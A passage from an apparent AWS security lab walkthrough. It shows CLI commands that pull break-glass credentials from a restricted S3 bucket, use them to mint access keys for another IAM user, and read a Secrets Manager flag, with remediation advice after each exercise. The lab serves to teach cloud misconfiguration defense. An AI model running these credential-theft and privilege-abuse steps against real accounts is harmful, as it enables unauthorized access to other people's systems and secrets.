Since you have a shell on the EC2 instance (Exercise 7) which is inside the VPC, your requests will natively originate from the allowed VPC Endpoint.

**Step 2: Download the Flag**
From the SSM session on the EC2 instance:

```bash
aws s3 cp s3://palmart-rv-prod-s3/private/private.txt -
```

The file contains credentials for the `break-glass-user`.

### Remediation

1.  **Robust Conditions:** Combine `aws:SourceVpce` with `aws:PrincipalArn` using strict logical operators.
2.  **Encryption:** Use KMS Customer Managed Keys (CMKs) to encrypt data. Even if the network policy is bypassed, the attacker would still need `kms:Decrypt` permissions.

### Further Reading

* [S3 Bucket Policies](https://docs.aws.amazon.com/AmazonS3/latest/userguide/bucket-policies.html)
* [VPC Endpoints for S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/privatelink-interface-endpoints.html)

---

## Exercise 9: Create Access Key and Get Flag

### What is the Break-Glass?

A "break-glass" account is an emergency access account used when normal access methods fail. These accounts typically have elevated privileges and should be heavily monitored and protected.

### Exploitation

**Step 1: Configure Break-Glass Profile**
```bash
aws configure --profile breakglass
# Input credentials from private.txt
```

Verify that the credentials is working.

```bash
aws sts get-caller-identity --profile breakglass
{
    "UserId": "AIDAZNKM5ODGBAVGKTSRU",
    "Account": "111111111111",
    "Arn": "arn:aws:iam::111111111111:user/break-glass-user"
}
```

**Step 2: Abuse Privileges**
The `break-glass` user has permission to create access keys for the `flag-user`.

```bash
aws iam create-access-key --user-name flag-user --profile breakglass
{
    "AccessKey": {
        "UserName": "flag-user",
        "AccessKeyId": "[REDACTED]",
        "Status": "Active",
        "SecretAccessKey": "[REDACTED]",
        "CreateDate": "2026-01-22T16:20:23+00:00"
    }
}
```

> **Troubleshooting:** If the user already has 2 keys, delete one first:
> ```bash
> aws iam list-access-keys --user-name flag-user --profile breakglass
> aws iam delete-access-key --user-name flag-user --access-key-id <OLD_KEY_ID> --profile breakglass
> ```

**Step 3: Retrieve the Flag**
Configure a profile for the `flag-user` and access the Secrets Manager.

```bash
aws secretsmanager get-secret-value --secret-id palmart-rv-prod-flag --profile flag-user
```

**Success!** You have retrieved the final flag.

### Remediation

1.  **MFA Enforcement:** Require Multi-Factor Authentication for all break-glass activities.
2.  **Alerting:** Create immediate high-priority alerts for `iam:CreateAccessKey` events on privileged users.

---

## Acknowledgments

This lab was created for educational purposes to demonstrate common AWS misconfigurations and attack techniques. Always ensure you have proper authorization before performing security assessments.

*Happy Hacking!*
